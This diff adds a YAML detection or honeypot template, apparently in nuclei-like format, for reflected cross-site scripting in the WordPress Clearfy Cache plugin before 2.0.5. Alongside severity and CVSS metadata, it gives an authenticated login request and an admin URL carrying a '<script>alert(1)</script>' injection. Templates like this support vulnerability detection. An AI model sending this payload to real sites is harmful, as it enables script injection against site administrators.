@@ -1,0 +1,42 @@
+id: clearfy-cache-xss
+info:
+  name: WordPress Clearfy Cache <2.0.5 - Cross-Site Scripting
+  author: Akincibor
+  description: WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting
+    them back in attributes, leading to reflected cross-site scripting.
+  severity: medium
+  reference:
+  - https://wpscan.com/vulnerability/a59e7102-13d6-4f1e-b7b1-75eae307e516
+  - https://wordpress.org/plugins/clearfy
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    max-request: 2
+  tags: xss,wp,wordpress,authenticated,clearfy-cache,wpscan,wp-plugin
+traps:
+- request:
+    method: POST
+    path: /wp-login.php
+    headers:
+      Origin: '{{RootURL}}'
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: wordpress_test_cookie=WP%20Cookie%20check
+    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: '"><script>alert(1)</script>Webcraftic Clearfy - WordPress optimization
+      plugin'
+- request:
+    method: GET
+    path: /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script>
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
